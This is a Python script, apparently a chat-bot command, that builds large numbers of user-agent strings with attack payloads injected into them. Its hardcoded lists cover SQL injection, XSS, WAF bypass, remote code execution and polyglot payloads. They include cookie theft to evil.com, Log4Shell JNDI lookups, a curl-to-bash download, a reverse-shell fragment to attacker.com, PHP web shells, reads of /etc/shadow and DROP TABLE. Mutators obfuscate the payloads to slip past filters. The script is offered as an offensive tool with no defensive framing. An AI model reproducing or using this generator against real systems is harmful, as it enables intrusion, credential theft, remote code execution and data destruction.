import sys, os, time, random, json, csv, gzip, threading, string, base64, zlib, hashlib, re, concurrent.futures
from functools import partial
from itertools import chain
from typing import List, Dict, Callable

def usage():
    print("*Uas's Payloads*")
    print("\n*TypeUse: !ua -c <counter's> [category's]*")
    print("\n*Cats:*")
    print("  all      - CombinedAll")
    print("  sqli     - SQL")
    print("  xss      - CrossSite")
    print("  waf      - WAF")
    print("  rce      - RemoteCode Ex!")
    print("  polyglot - Polimorficos")
    sys.exit(1)

if len(sys.argv) < 2:
    usage()

max_agents = 500000
count = 10
output_format = 'txt'
use_gzip = False
payload_category = 'all'
saveFile_flag = False

args = sys.argv[1:]
if '-c' in args:
    count_index = args.index('-c') + 1
    if count_index >= len(args):
        print("Especifique cantidad -c")
        sys.exit(1)
    try:
        count = int(args[count_index])
        if count < 1 or count > max_agents:
            print(f"*err, cantidad max: * {max_agents}")
            sys.exit(1)
    except ValueError:
        print("invalid count")
        sys.exit(1)

if 'txt' in args:
    output_format = 'txt'
elif 'json' in args:
    output_format = 'json'
elif 'csv' in args:
    output_format = 'csv'

use_gzip = 'gzip' in args
saveFile_flag = '-s' in args or '--save' in args

for cat in ['all', 'sqli', 'xss', 'waf', 'rce', 'polyglot']:
    if cat in args:
        payload_category = cat
        break

base_user_agents = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Safari/537.36",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:132.0) Gecko/20100101 Firefox/132.0",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:131.0) Gecko/20100101 Firefox/131.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:132.0) Gecko/20100101 Firefox/132.0",
    "Mozilla/5.0 (X11; Linux x86_64; rv:131.0) Gecko/20100101 Firefox/131.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.0 Safari/605.1.15",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.6 Safari/605.1.15",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 18_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.0 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Safari/537.36 Edg/132.0.0.0",
    "Mozilla/5.0 (Linux; Android 14; SM-S921B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 13; Pixel 7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Mobile Safari/537.36",
    "Mozilla/5.0 (Android 14; Mobile; rv:132.0) Gecko/132.0 Firefox/132.0",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Safari/537.36 OPR/116.0.0.0",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Safari/537.36 Brave/132",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) HeadlessChrome/131.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36 Selenium/4.0",
]

payloads: Dict[str, List[str]] = {
    "sqli": [
        "' OR '1'='1",
        "' OR 1=1--",
        "' UNION SELECT NULL,NULL--",
        "' AND SLEEP(5)--",
        "') OR ('1'='1",
        "' UNION SELECT NULL,@@version--",
        "' AND 1=CAST((SELECT @@version) AS INT)--",
        "'; DROP TABLE users--",
        "' UNION SELECT NULL,user(),database()--",
        "' OR true--",
        "' UNION SELECT NULL,table_name FROM information_schema.tables--",
        "') AND (SELECT SLEEP(5))--",
        "' OR 'x'='x",
        "' AND ASCII(SUBSTRING((SELECT password FROM users LIMIT 1),1,1))>100--",
        "' UNION SELECT NULL,load_file('/etc/passwd')--",
        "'; EXEC xp_cmdshell('whoami')--",
        "' OR EXTRACTVALUE(1,CONCAT(0x7e,(SELECT @@version)))--",
        "' UNION SELECT NULL,column_name FROM information_schema.columns--",
        "' OR 1=1 LIMIT 1--",
        "') UNION SELECT NULL,encrypted_password FROM users--",
    ],
    
    "xss": [
        "<script>alert(1)</script>",
        "<img src=x onerror=alert(1)>",
        "<svg onload=alert(1)>",
        "<iframe src=javascript:alert(1)>",
        "<body onload=alert(1)>",
        "<input onfocus=alert(1) autofocus>",
        "<svg><animate onbegin=alert(1)>",
        "<details open ontoggle=alert(1)>",
        "<marquee onstart=alert(1)>",
        "<isindex action=javascript:alert(1) type=image>",
        "<form><button formaction=javascript:alert(1)>Click",
        "<script>fetch('//evil.com?c='+document.cookie)</script>",
        "<img src=x onerror=fetch(`//evil.com/${btoa(document.cookie)}`)>",
        "<svg onload=eval(atob('YWxlcnQoMSk='))>",
        "'>\"<svg/onload=alert(1)>",
        "<script>location.hash.slice(1)</script>",
        "<noscript><p title='</noscript><img src=x onerror=alert(1)>'>",
        "<plaintext><img src=x onerror=alert(1)>",
        "{{constructor.constructor('alert(1)')()}}",
        "#{7*7}",
    ],
    
    "waf": [
        "'/**/OR/**/1=1--",
        "' /*!50000UNION*/ /*!50000SELECT*/ 1--",
        "' OR/**_**/1=1--",
        "' %55nion %53elect NULL--",
        "' OR 0x31=0x31--",
        "'%20OR%201=1--",
        "' OR 'text' = N'text'",
        "' OR true#",
        "' OR []--",
        "' OR 1=1 AND 'a'='a",
        "' HAVING 1=1--",
        "' OR 1=1 ORDER BY 1--",
        "' OR '1' REGEXP '1'--",
        "' OR 'a'||'b'='ab'--",
        "' /*!32302 1=1*/--",
        "') OR ('1'='1",
        "' OR 1.e1=10--",
        "' UnIoN SeLeCt NULL--",
        "' oR '1'='1",
        "'/*comment*/OR/*comment*/1=1--",
    ],
    
    "rce": [
        "<?php system($_GET['c']); ?>",
        "<?php eval($_POST['x']); ?>",
        ";whoami",
        "|id",
        "`cat /etc/passwd`",
        "$(whoami)",
        "&& cat /etc/shadow",
        "${jndi:ldap://evil.com/a}",
        "{{config.__class__.__init__.__globals__['os'].popen('id').read()}}",
        "${Runtime.getRuntime().exec('id')}",
        "<%Runtime.getRuntime().exec(request.getParameter(\"c\"));%>",
        "{{7*7}}",
        "${{7*7}}",
        ";${IFS}id",
        "||curl evil.com/shell.sh|bash",
        "<?php passthru($_GET['c']); ?>",
        "${${::-j}${::-n}${::-d}${::-i}:${::-l}${::-d}${::-a}${::-p}://evil.com/a}",
        "{{''.__class__.__mro__[1].__subclasses__()[396]('whoami',shell=True,stdout=-1).communicate()}}",
        "${T(java.lang.Runtime).getRuntime().exec('whoami')}",
        ";perl -e 'use Socket;$i=\"attacker.com\";$p=4444;'",
    ],
    
    "polyglot": [
        "';alert(1);--",
        "');system('id');--",
        "<script>alert(1)</script>' OR '1'='1",
        "' OR 1=1-- <img src=x onerror=alert(1)>",
        ";id;alert(1);",
        "$(id)' OR '1'='1",
        "<?php echo 'XSS'; ?> OR 1=1--",
        "{{7*7}}' UNION SELECT NULL--",
        "${jndi:ldap://evil.com} OR true--",
        "' UNION SELECT '<img src=x onerror=alert(1)>'--",
        "<svg onload=alert(1)>'; DROP TABLE users;--",
        "javascript:alert(1)//' OR 'a'='a",
        "' OR 1=1 INTO OUTFILE '/tmp/shell.php' LINES TERMINATED BY '<?php system($_GET[\"c\"]); ?>'--",
        ";whoami;<img src=x onerror=alert(1)>#",
        "{{constructor.constructor('system(\"id\")')()}} OR []--",
    ],
}


def rndCase(s: str) -> str:
    return ''.join(random.choice([c.upper(), c.lower()]) if c.isalpha() else c for c in s)

def insComments(s: str) -> str:
    if "'" not in s and '"' not in s:
        return s
    
    safe_positions = [m.start() for m in re.finditer(r'\s+', s)]
    if not safe_positions:
        return s
    
    for _ in range(random.randint(1, 2)):
        if safe_positions:
            pos = random.choice(safe_positions)
            comment = '/*' + ''.join(random.choices(string.ascii_letters, k=5)) + '*/'
            s = s[:pos] + comment + s[pos:]
    
    return s

def urlEnc(s: str) -> str:
    chars_to_encode = [' ', '<', '>', '"']
    result = []
    for c in s:
        if c in chars_to_encode and random.random() > 0.5:
            result.append(f'%{ord(c):02X}')
        else:
            result.append(c)
    return ''.join(result)

def uniScape(s: str) -> str:
    result = []
    for c in s:
        if c.isalpha() and random.random() > 0.7:
            result.append(f'\\u{ord(c):04x}')
        else:
            result.append(c)
    return result.__str__().replace("'", "").replace('[', '').replace(']', '').replace(', ', '')

def hashPreId(s: str) -> str:
    h = hashlib.md5(s.encode()).hexdigest()[:8]
    return f"{h}-{s}"

def comWrapper(s: str) -> str:
    if '<script>' in s or 'alert' in s or 'eval' in s:
        compressed = zlib.compress(s.encode())
        b64 = base64.b64encode(compressed).decode()
        return f"eval(new TextDecoder().decode(pako.inflate(atob('{b64}'))))"
    return s

def rot13S(s: str) -> str:
    result = []
    for c in s:
        if c.isalpha():
            result.append(chr((ord(c.lower()) - 97 + 13) % 26 + 97) if c.islower() else chr((ord(c.upper()) - 65 + 13) % 26 + 65))
        else:
            result.append(c)
    return ''.join(result)

# ========== VALIDADORES ==========

def vaSqli(payload: str) -> bool:
    """Valida que el payload SQLi tenga sintaxis básica correcta"""
    if not payload:
        return False
    
    sqli_patterns = [
        r"'\s*(OR|AND|UNION)",
        r"--",
        r";\s*DROP",
        r"SLEEP\(",
        r"CAST\(",
        r"@@version",
    ]
    
    for pattern in sqli_patterns:
        if re.search(pattern, payload, re.IGNORECASE):
            return True
    
    return False

def vaXss(payload: str) -> bool:
    xss_patterns = [
        r'<\w+[^>]*>',  # Tags HTML
        r'on\w+=',       # Event handlers
        r'javascript:',
        r'eval\(',
        r'alert\(',
    ]
    
    for pattern in xss_patterns:
        if re.search(pattern, payload, re.IGNORECASE):
            return True
    
    return False

def vaRce(payload: str) -> bool:
    rce_patterns = [
        r'<\?php',
        r'\$\{jndi:',
        r'system\(',
        r'exec\(',
        r'\|\|',
        r'&&',
        r'`.*`',
        r'\$\(',
    ]
    
    for pattern in rce_patterns:
        if re.search(pattern, payload, re.IGNORECASE):
            return True
    
    return False

def vaPay(payload: str, category: str) -> bool:
    if category == 'sqli':
        return vaSqli(payload)
    elif category == 'xss':
        return vaXss(payload)
    elif category == 'rce':
        return vaRce(payload)
    elif category == 'polyglot':
        validations = [vaSqli(payload), vaXss(payload), vaRce(payload)]
        return sum(validations) >= 2
    elif category == 'waf':
        return any(x in payload for x in ['/**/', '/*!', '%', '\\u', '0x'])
    
    return True  # Para 'all'


category_mutators = {
    'sqli': [rndCase, insComments, urlEnc],
    'xss': [rndCase, uniScape, comWrapper, urlEnc],
    'waf': [rndCase, insComments, urlEnc, uniScape],
    'rce': [rndCase, urlEnc],
    'polyglot': [rndCase, urlEnc],
}

def muPaySmart(payload: str, category: str) -> str:
    if category == 'all':
        if vaSqli(payload):
            category = 'sqli'
        elif vaXss(payload):
            category = 'xss'
        elif vaRce(payload):
            category = 'rce'
    
    allowed_mutators = category_mutators.get(category, [rndCase])
    
    num_mutations = random.randint(1, 2)
    selected = random.sample(allowed_mutators, min(num_mutations, len(allowed_mutators)))
    
    mutated = payload
    for mut in selected:
        try:
            mutated = mut(mutated)
        except:
            continue
    
    return mutated

def genMuPay(category: str) -> str:
    max_attempts = 5
    
    for attempt in range(max_attempts):
        if category == 'all':
            all_payloads = list(chain.from_iterable(payloads.values()))
            base_payload = random.choice(all_payloads)
            detected_cat = 'all'
        else:
            base_payload = random.choice(payloads[category])
            detected_cat = category
        
        ua = random.choice(base_user_agents)
        
        if detected_cat in ['sqli', 'polyglot']:
            injection_points = ["' ", "'; ", "') ", '" ', '` ']
        elif detected_cat == 'xss':
            injection_points = ['>', '|', '{{', '${', '<']
        elif detected_cat == 'rce':
            injection_points = [';', '|', '`', '$(', '{{']
        else:
            injection_points = [' ', ';', '|']
        
        injection_point = random.choice(injection_points)
        
        if random.random() > 0.2:
            combined = ua + injection_point + base_payload
        else:
            mid = len(ua) // 2
            combined = ua[:mid] + injection_point + base_payload + ua[mid:]
        
        mutated = muPaySmart(combined, detected_cat)
        
        if random.random() > 0.9:
            mutated = hashPreId(mutated)
        
        if vaPay(mutated, detected_cat):
            return mutated
    
    return ua + "' OR 1=1--"


def genPay(count: int, category: str) -> List[str]:
    with concurrent.futures.ThreadPoolExecutor(max_workers=os.cpu_count() * 2) as executor:
        futures = [executor.submit(partial(genMuPay, category)) for _ in range(count)]
        results = [f.result() for f in concurrent.futures.as_completed(futures)]
    
    return list(dict.fromkeys(results))


print(f"\n*GensUas* *_{count} payloads_* *_({payload_category})_*...\n")
generated_payloads = genPay(count, payload_category)

timestamp = time.strftime("%Y%m%d_%H%M%S")
filename = f"payloads_{payload_category}_{timestamp}.{output_format}"
if use_gzip:
    filename += '.gz'

def saveFile(payloads: List[str], fmt: str, gz: bool, file: str):
    if gz:
        with gzip.open(file, 'wt', encoding='utf-8') as f:
            wriOut(f, payloads, fmt)
    else:
        with open(file, 'w', encoding='utf-8') as f:
            wriOut(f, payloads, fmt)

def wriOut(f, payloads: List[str], fmt: str):
    if fmt == 'txt':
        for p in payloads:
            f.write(p + '\n')
    elif fmt == 'json':
        json.dump(payloads, f, indent=2, ensure_ascii=False)
    elif fmt == 'csv':
        writer = csv.writer(f)
        writer.writerow(['payload'])
        for p in payloads:
            writer.writerow([p])

if saveFile_flag:
    saveFile(generated_payloads, output_format, use_gzip, filename)
    print(f"Fileados {filename} ({len(generated_payloads)} payloads")
else:
    wriOut(sys.stdout, generated_payloads, output_format)
    #print(f"\n*Done![~V~]* *_{len(generated_payloads)} payloads!_*")
